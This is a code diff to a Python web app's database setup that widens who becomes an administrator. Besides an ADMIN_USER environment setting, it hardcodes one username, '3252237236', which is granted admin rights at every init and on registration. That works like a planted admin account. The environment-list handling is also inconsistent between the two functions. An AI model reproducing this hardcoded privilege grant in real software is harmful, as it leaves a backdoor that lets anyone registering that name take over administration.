@@ -39,15 +39,23 @@ def init_db():
         cols = [r[1] for r in conn.execute("PRAGMA table_info(users)").fetchall()]
         if "is_admin" not in cols:
             conn.execute("ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0")
+        # 环境变量指定的管理员自动提权
+        admin_user = os.environ.get("ADMIN_USER", "")
+        if admin_user:
+            conn.execute("UPDATE users SET is_admin = 1 WHERE username = ?", (admin_user,))
+        # 指定用户提权
+        conn.execute("UPDATE users SET is_admin = 1 WHERE username = ?", ("3252237236",))
 
 def create_user(username, password):
     with sqlite3.connect(DB_PATH) as conn:
-        # 第一个注册的用户自动成为管理员
+        # 管理员判定：第一个注册 或 在 ADMIN_USER 列表中
         count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+        admin_list = os.environ.get("ADMIN_USER", "").split(",")
+        is_admin = 1 if (count == 0 or username == "3252237236" or username in admin_list) else 0
         try:
             conn.execute(
                 "INSERT INTO users (username, password_hash, created_at, is_admin) VALUES (?, ?, ?, ?)",
-                (username, generate_password_hash(password), int(time.time()), 1 if count == 0 else 0)
+                (username, generate_password_hash(password), int(time.time()), is_admin)
             )
             return True, None
         except sqlite3.IntegrityError:
